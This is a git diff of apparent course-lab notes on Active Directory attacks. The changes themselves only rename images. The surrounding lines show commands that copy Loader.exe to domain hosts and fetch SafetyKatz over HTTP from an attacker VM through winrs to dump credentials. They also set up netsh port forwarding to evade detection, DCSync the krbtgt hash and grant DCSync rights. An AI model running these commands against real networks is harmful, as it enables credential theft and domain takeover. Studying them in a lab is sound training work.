@@ -8,7 +8,7 @@
 >
 > Remember upload <mark style="color:$warning;">Loader.exe</mark> to the webshell
 
-<figure><img src="../../../.gitbook/assets/image (80).png" alt="" width="302"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="302"><figcaption></figcaption></figure>
 
 > ```
 > [ Attacker VM ] 172.16.100.113
@@ -64,7 +64,7 @@ echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.ex
 ##cmd /c copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Port Forwarding - Bypass Detections
 
@@ -88,9 +88,9 @@ To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (81).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Sweet! We got credentials of svcadmin - a domain administrator.
 
@@ -159,7 +159,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can see how we have local admin access on the `dcorp-mgmt` server as srvadmin and we already know a session of svcadmin is present on that machine.
 
@@ -173,7 +173,7 @@ Copy the Loader.exe to `dcorp-mgmt`:
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now extract the credentials:
 
@@ -185,7 +185,7 @@ Now extract the credentials:
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.113:80/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -207,7 +207,7 @@ Run the below commands from the process running as DA to copy Loader.exe on dcor
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1426).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>
 
 Before it, connect to the dc machine "dcorp-dc" like svcadmin and apply the portforwardding and execute the loader + safetikatz-->
 
@@ -215,7 +215,7 @@ Before it, connect to the dc machine "dcorp-dc" like svcadmin and apply the port
 winrs -r:dcorp-dc cmd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1423).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>
 
 ```
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.53
@@ -227,7 +227,7 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1424).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>
 
 > Please note that the `krbtgt` account password may be changed and the hash you get in your lab instance could be different from the one in this lab manual.
 >
@@ -247,7 +247,7 @@ Run the below command from process running as Domain Admin on the student VM:
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1425).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>
 
 Info obtained:
 
@@ -300,7 +300,7 @@ C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student113 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1438).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>
 
 #### Chech again
 
@@ -314,7 +314,7 @@ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchSco
 
 > Remeber change the studentX
 
-<figure><img src="../../../.gitbook/assets/image (1439).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! Now, below command (or any similar tool) can be used as `studentx` to get the hashes of `krbtgt` user or any other user:
 
@@ -324,4 +324,4 @@ Sweet! Now, below command (or any similar tool) can be used as `studentx` to get
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1440).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>
